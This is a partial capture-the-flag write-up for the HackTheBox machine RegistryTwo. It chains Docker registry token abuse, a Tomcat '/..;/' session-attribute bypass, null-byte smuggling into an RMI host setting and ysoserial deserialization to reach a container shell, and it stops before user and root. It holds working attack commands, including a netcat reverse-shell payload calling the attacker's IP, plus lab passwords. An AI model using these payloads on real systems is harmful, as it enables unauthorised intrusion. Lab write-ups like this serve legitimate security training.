# HackTheBox — RegistryTwo

![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty: Insane](https://img.shields.io/badge/Difficulty-Insane-purple)
![Tags: docker-registry, tomcat, java-rmi, deserialization](https://img.shields.io/badge/Tags-Docker%20Registry%20%7C%20Tomcat%20%7C%20Java%20RMI%20%7C%20Deserialization-orange)

> 🚧 **[partial — original notes get to the foothold inside a Docker container, but stop before user/root]**
>
> Prefatory note: the original notes start with a `Creds` block listing what appear to be the final passwords (`developer: qybWiMTRg0sIHz4beSTUzrVIl7t3YsCj9` / `root: 52nWqz3tejiImlbsihtV`). These are preserved at the bottom under "Final Credentials" but the chain that recovers them isn't documented.

---

## Attack Chain at a Glance

```
nmap → wide attack surface (22, 443, 3306, 3310, 5000, 5001, 8009, 8080, 9002, 46193)
   → :5000 = Docker Registry v2, :5001 = Acme auth server (cesanta/docker_auth)
   → fetch JWT bearer from :5001/auth → list /v2/_catalog → "hosting-app"
   → pull manifest + blobs → extract layers → filesystem of the container image
   → /etc/hosting.ini reveals mysql/rmi creds + rmi.host
   → /usr/local/tomcat/webapps/hosting.war (jadx-gui) reveals:
        - /reconfigure servlet protected by s_IsLoggedInUserRoleManager
        - bypass via /hosting/..;/examples/servlets/servlet/SessionExample
          (Tomcat path-traversal via ;)
        - SessionExample lets us set arbitrary session attributes including
          s_IsLoggedInUserRoleManager=true → admin
   → /reconfigure accepts ANY key=value → write rmi.host=10.10.14.175%00.htb
     (null-byte abuse of the ".htb suffix" guard)
   → Java RMI deserialization via remote-method-guesser + ysoserial
   → reverse shell as Tomcat (inside Docker container)
   → 🚧 [path from container → host]
   → 🚧 [user]
   → 🚧 [privesc to root]
```

---

## Reconnaissance

### Nmap Scan

```bash
sudo nmap -sSCV -p- -Pn --min-rate=5000 -oN nmap.txt 10.129.169.19
```

<details>
<summary>Click to expand</summary>

```
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
443/tcp   open  ssl/http           nginx 1.14.0 (webhosting.htb)
3306/tcp  open  mysql              MySQL 5.7.41
3310/tcp  open  clam               ClamAV 0.103.8
5000/tcp  open  ssl/http           Docker Registry (API: 2.0)
5001/tcp  open  ssl/commplex-link  "<h1>Acme auth server</h1>"
8009/tcp  open  ajp13              Apache Jserv (Protocol v1.3)
8080/tcp  open  http-proxy         (Apache Tomcat 9)
9002/tcp  open  java-rmi
| rmi-dumpregistry:
|   QuarantineService → @registry.webhosting.htb:40815
|   FileService       → @registry.webhosting.htb:40815
46193/tcp open  java-rmi
```

</details>

The cert SAN reveals `webhosting.htb` and `*.webhosting.htb` — add both to `/etc/hosts`.

### Surface Triage

| Port | Service | Status |
|------|---------|--------|
| 22   | OpenSSH 7.6p1 | Username enumeration vuln, but no creds yet |
| 443  | nginx 1.14.0 — `webhosting.htb` | Public site; resolver off-by-one (DNS-side) — not viable |
| 3306 | MySQL 5.7.41 | CVE-2023-21980 patched; brute-force `root` failed |
| 3310 | ClamAV 0.103.8 | Patched; PING test no PONG — likely binding restricted |
| 5000 | **Docker Registry v2** | [HackTricks ref](https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry) |
| 5001 | **Acme auth server** | [cesanta/docker_auth](https://github.com/cesanta/docker_auth) — issues JWTs for the registry |
| 8009 | AJP13 | GhostCat (CVE-2020-1938) — old, likely patched |
| 8080 | Tomcat 9 | Deserialization vector |
| 9002 | Java RMI | `QuarantineService`, `FileService` exposed; intentional |
| 46193 | Java RMI | RMI random callback port |

The high-value target is the **Docker Registry chain**: pull container images → recover internal config and source.

---

## Initial Foothold

### Step 1 — Get a JWT from the Acme Auth Server

The registry replies `401` to anonymous catalog requests:

```bash
curl --insecure --url "https://www.webhosting.htb:5000/v2/_catalog"
```

```json
{"errors":[{"code":"UNAUTHORIZED","message":"authentication required",
            "detail":[{"Type":"registry","Class":"","Name":"catalog","Action":"*"}]}]}
```

Per the [Docker Registry token-auth spec](https://docs.docker.com/registry/spec/auth/token/), request a bearer token from `:5001/auth`:

```bash
curl --insecure --url \
  "https://www.webhosting.htb:5001/auth?service=Docker+registry&scope=registry:catalog:*"
```

The returned JWT decodes to:

```json
{
  "iss": "Acme auth server",
  "exp": 1690060300, "nbf": 1690059390, "iat": 1690059400,
  "jti": "2538877648628950212",
  "access": []
}
```

> 💡 The `access` claim is empty even though we asked for `scope=registry:catalog:*`. The server does some scope validation server-side — but the bearer is still accepted by the registry for the requested scope. The Acme auth server likely binds the scope to the JWT's `jti`, not the visible `access` claim.

### Step 2 — Enumerate the Registry

```bash
curl --insecure -X GET --url "https://www.webhosting.htb:5000/v2/_catalog" \
     -H "Authorization: Bearer <jwt>"
```

```json
{"repositories":["hosting-app"]}
```

Tags require a different scope ([scope spec](https://docs.docker.com/registry/spec/auth/scope/)):

```bash
curl --insecure --url \
  "https://www.webhosting.htb:5001/auth?service=Docker+registry&scope=repository:hosting-app:pull"
```

```bash
curl --insecure -H "Authorization: Bearer <new-jwt>" \
     "https://www.webhosting.htb:5000/v2/hosting-app/tags/list"
```

```json
{"name":"hosting-app","tags":["latest"]}
```

### Step 3 — Download and Extract the Image

A Python helper handles the JWT renewal and blob fetching automatically:

```bash
python3 interact.py \
  "https://www.webhosting.htb:5000/v2/hosting-app/manifests/latest" \
  "https://www.webhosting.htb:5001/auth?service=Docker+registry&scope=repository:hosting-app:pull"
```

This pulls the manifest (saved as `manifest.json`) and downloads each blob into `./blobs/`.

Reassemble the filesystem:

```bash
mkdir extracted
cat blobs/*.tar.gz | tar -xzf - -C extracted -i
```

### Step 4 — Recovered Configuration

```bash
cat extracted/etc/hosting.ini
```

```ini
#Mon Jan 30 21:05:01 GMT 2023
mysql.password=O8lBvQUBPU4CMbvJmYqY
rmi.host=registry.webhosting.htb
mysql.user=root
mysql.port=3306
mysql.host=localhost
domains.start-template=<body>\r\n<h1>It works\!</h1>\r\n</body>
domains.max=5
rmi.port=9002
```

### Step 5 — Source Code via jadx-gui

The image contains `/usr/local/tomcat/webapps/hosting.war`. Open in jadx-gui and read:

**`com.htb.hosting.services.ConfigurationServlet`** (preserved as `configurationservlet.java`):

```java
boolean isManager = request.getSession()
                          .getAttribute(Constants.S_IS_USER_ROLE_MGR);

@Override
public void doPost(HttpServletRequest request, HttpServletResponse response) {
    if (!checkManager(request, response)) return;
    Map<String, String> parameterMap = new HashMap<>();
    request.getParameterMap().forEach((k, v) -> parameterMap.put(k, v[0]));
    Settings.updateBy(parameterMap);                           // ← writes to /etc/hosting.ini
    // ...
}
```

**`com.htb.hosting.utils.Constants`** (preserved as `constants.java`):

```java
public static final String S_IS_USER_ROLE_MGR = "s_IsLoggedInUserRoleManager";
public static final File SETTINGS_FILE = new File("/etc/hosting.ini");
```

**`com.htb.hosting.utils.config.Settings`** (key fragment):

```java
public static void updateBy(Map<String, String> parameterMap) {
    parameterMap.forEach((k, v) -> prop.put(k, v));
    prop.store(new FileOutputStream(Constants.SETTINGS_FILE), null);
}
```

**Critical**: `updateBy` accepts arbitrary keys. If we can hit `/reconfigure`, we can set **any** key in `hosting.ini` — including `rmi.host`.

**`com.htb.hosting.rmi.RMIClientWrapper`** has the guard:

```java
String rmiHost = (String) Settings.get(String.class, "rmi.host", null);
if (!rmiHost.contains(".htb")) {
    rmiHost = "registry.webhosting.htb";
}
```

The check is `.contains(".htb")` — string-substring, not endswith. Any value containing `.htb` somewhere passes.

### Step 6 — Bypass the Manager Check via Tomcat `/..;/`

Reaching `/reconfigure` requires `s_IsLoggedInUserRoleManager == true`. Normal users don't get this attribute set on their session.

[Tomcat path-traversal via semicolon](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#path-traversal-..) lets us reach the `examples` webapp despite reverse-proxy access controls:

```
https://www.webhosting.htb/hosting/..;/examples/servlets/servlet/SessionExample
```

`SessionExample` is a [vulnerable demo servlet](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/) that lets us *set* arbitrary session attributes. Submit the form:

```
attribute name:  s_IsLoggedInUserRoleManager
attribute value: true
```

Refresh the dashboard at `https://www.webhosting.htb/hosting/`. The reconfigure link appears.

### Step 7 — Null-byte Smuggling Into rmi.host

In Burp, capture the legitimate POST to `/hosting/reconfigure`:

```
domains.max=5&domains.start-template=%3Cbody%3E%0D%0A%3Ch1%3EIt+works%21%3C%2Fh1%3E%0D%0A%3C%2Fbody%3E
```

Append our injected key:

```
&rmi.host=10.10.14.175%00.htb
```

The payload becomes `rmi.host=10.10.14.175\u0000.htb`. Java's `String.contains(".htb")` returns true (since `.htb` *is* present in the string), but the underlying RMI native code interprets the null byte as a string terminator — so the connection target becomes `10.10.14.175`.

> 💡 The Java vs. native-code disagreement on null bytes is a recurring pattern (CVE-2008-2938 was a similar issue in `URL`). Whenever a Java string is checked at the JVM level then passed to a JNI/native consumer, null-byte truncation is worth trying.

### Step 8 — RMI Deserialization with remote-method-guesser

References:
- [HackTricks — Java RMI](https://book.hacktricks.xyz/network-services-pentesting/1099-pentesting-java-rmi)
- [`remote-method-guesser`](https://github.com/qtc-de/remote-method-guesser)

Set up listeners:

```bash
nc -lvnp 9001       # reverse-shell catcher
```

Run rmg's `listen` mode (note: java-11 specifically — the gadget chain doesn't load on newer JREs):

```bash
/usr/lib/jvm/java-11-openjdk-amd64/bin/java \
    -jar rmg-4.4.1-jar-with-dependencies.jar listen 0.0.0.0 9002 \
    CommonsCollections6 \
    --yso ysoserial-all.jar \
    'nc 10.10.14.175 9001 -e bash'
```

This stands up a malicious RMI registry/server on `:9002`. When the Tomcat app tries to call `rmi.host:9002`, it deserializes the response — triggering the `CommonsCollections6` chain and shelling out via `nc -e`.

### Step 9 — Trigger

In the Burp request, after sending the modified config, **create a subdomain** in the dashboard, then click on it. The click forces a fresh RMI call against the (now-attacker-controlled) `rmi.host`. The `rmi.host` setting is overwritten quickly — you may need to re-send the reconfigure request immediately before clicking.

The netcat listener catches a reverse shell **inside a Docker container** running Tomcat.

🚧 **[gap from original]** — exact user and where in the chain user.txt lives.

---

## Container → Host

> 🚧 **[incomplete]**. The original notes stop after confirming "this is your foothold into a docker container."
>
> Inferred from the recon: there's a host-side OpenSSH 7.6p1, MySQL with `mysql.password=O8lBvQUBPU4CMbvJmYqY`, and another Java-RMI service (`QuarantineService`, `FileService`) that's almost certainly the path forward — likely with another deserialization gadget or an authenticated method that copies files between container and host. Without notes confirming that path, anything specific would be invention.

---

## User Flag

> 🚧 **[incomplete]**

---

## Privilege Escalation

> 🚧 **[incomplete]**

---

## Root Flag

> 🚧 **[incomplete]**

---

## Final Credentials (from original notes, chain to recover not documented)

```
developer: qybWiMTRg0sIHz4beSTUzrVIl7t3YsCj9
root:      52nWqz3tejiImlbsihtV
```

> 🚧 These were preserved verbatim from the top of the original notes. Without the missing privesc narrative, it's not clear which of these unlocks user vs which unlocks root, or whether they're SSH passwords / DB passwords / something else. Verify on a fresh playthrough.

---

## Lessons Learned

> 🚧 **[partial — these reflect what's documented; a complete writeup would add lessons from the user→root path]**
>
> - **Docker Registry without TLS-bound auth is a source-code leak.** Pulling container images gives you the *configuration* and *bytecode* of the running services — far more than just an LFI on `/etc/passwd` would.
> - **`jadx-gui` against `.war` files is mandatory** for Tomcat boxes. Method names alone often reveal the auth model (`s_IsLoggedInUserRoleManager` was the entire bypass).
> - **Tomcat's `/..;/` path-traversal applies to reverse-proxy ACLs**, not the application itself. Whenever you see a Tomcat app behind nginx/Apache that 403s on `/manager/`, try `/hosting/..;/manager/`.
> - **`String.contains(".htb")` is not the same as `.endsWith(".htb")`**. Whitelist guards using substring matching are routinely bypassable.
> - **Null-byte smuggling between Java string layer and native consumers** is a generalizable trick. Java itself doesn't terminate on `\u0000`; many native libraries do.
> - **Mismatched JVM versions break gadget chains.** `CommonsCollections6` in particular needs Java 8/11; using Java 17+ silently fails.

---

## Tools Referenced

| Tool | Purpose |
|------|---------|
| [`nmap`](https://nmap.org/) | Initial recon |
| [Docker Registry API](https://docs.docker.com/registry/spec/api/) | Pulling the `hosting-app` image |
| [cesanta/docker_auth](https://github.com/cesanta/docker_auth) | Reference for the Acme auth server's JWT flow |
| [`jadx-gui`](https://github.com/skylot/jadx) | Decompiling `hosting.war` |
| [Tomcat `/..;/` path traversal](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#path-traversal-..) | Reaching `/examples/SessionExample` |
| [`remote-method-guesser`](https://github.com/qtc-de/remote-method-guesser) | Java RMI scanner + `listen` mode |
| [`ysoserial`](https://github.com/frohoff/ysoserial) | `CommonsCollections6` gadget chain |
| [Burp Suite](https://portswigger.net/burp) | Capturing/replaying the `/reconfigure` POST |

---

## Supporting Files

This writeup directory should also include:

- `interact.py` — Python helper for talking to the Docker Registry API + auto-renewing JWTs
- `manifest.json` — saved manifest of the `hosting-app` image
- `configurationservlet.java` — decompiled `ConfigurationServlet`
- `constants.java` — decompiled `Constants` class
